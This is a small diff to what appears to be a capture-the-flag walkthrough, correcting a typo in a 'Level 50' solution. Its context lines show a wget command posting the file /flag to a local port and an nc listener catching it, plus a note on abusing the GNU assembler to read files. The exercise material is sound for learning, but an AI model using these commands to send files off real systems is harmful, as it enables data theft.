@@ -35,6 +35,6 @@ AS — the portable GNU assembler — can be used to read files by — as @[file
 Level 50  
 
 wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file /flag http://127.0.0.1:4554/  
-and set up a listeniner with nat cat  
+and set up a listener with nat cat  
 nc -vlnp 4554  
 and get the flag
